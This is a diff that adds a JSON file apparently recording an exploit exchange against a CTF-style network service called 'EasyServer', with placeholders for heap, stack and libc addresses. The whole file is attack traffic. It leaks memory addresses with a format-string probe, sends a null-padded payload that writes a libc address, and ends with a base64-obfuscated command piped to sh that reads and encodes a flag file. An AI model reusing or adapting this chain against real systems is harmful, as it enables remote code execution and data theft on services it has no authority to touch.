@@ -1,0 +1,8 @@
+[
+    "1Who {{{HEAP_BASE:65650:3:ORI:4:0x752072}}}?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-15824:12:HEX:18:0x7fff024f8230}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7fd4ffed0780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7fd4ffc012c0}}}:0x7fd5000f7700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7fd4ffbfb147}}}\\n", 
+    "1HTTP/1.1 404 {{{HEAP_BASE:20302:3:ORI:123:0x746f4e}}} {{{HEAP_BASE:85830:3:ORI:127:0x756f46}}}nd\\r\\nC{{{HEAP_BASE:20079:3:ORI:65:0x746e6f}}}{{{HEAP_BASE:20069:3:ORI:68:0x746e65}}}-Type{{{HEAP_BASE:58:3:ORI:36:0x74203a}}}{{{HEAP_BASE:22629:3:ORI:39:0x747865}}}{{{HEAP_BASE:18479:3:ORI:42:0x74682f}}}ml; char{{{HEAP_BASE:17779:3:ORI:53:0x746573}}}=UTF-8\\r\\nC{{{HEAP_BASE:20079:3:ORI:65:0x746e6f}}}{{{HEAP_BASE:20069:3:ORI:68:0x746e65}}}-Le{{{HEAP_BASE:18286:3:ORI:74:0x74676e}}}h: 23\\r\\nServer: EasyServer (L{{{HEAP_BASE:85609:3:ORI:105:0x756e69}}}x)\\r\\n\\r\\n<h3>Page {{{HEAP_BASE:20302:3:ORI:123:0x746f4e}}} {{{HEAP_BASE:85830:3:ORI:127:0x756f46}}}nd</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9m{{{HEAP_BASE:14169:3:ORI:22:0x745759}}}lLWNnaS9mbGFnIHxiYXNlNjQK\" |base64 -d |sh\\n"
+]
